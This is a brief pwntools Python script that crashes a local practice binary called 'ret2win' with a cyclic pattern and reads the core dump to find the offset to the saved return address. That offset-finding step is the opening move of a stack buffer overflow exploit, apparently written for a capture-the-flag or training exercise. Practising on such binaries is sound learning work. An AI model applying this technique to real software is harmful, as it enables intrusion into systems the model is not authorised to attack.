#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
 
from pwn import *
import os

# Set up pwntools for the correct architecture
elf = context.binary = ELF('ret2win')
io = process([elf.path])
io.sendline(cyclic(0x50))
io.wait()
core = io.corefile
rsp = core.rsp
pattern = core.read(rsp, 4)
offset = cyclic_find(pattern)
info(f"pattern     = {pattern.decode()}")
info(f"offset srip = 0x{offset:x}")

os.remove(core.path)
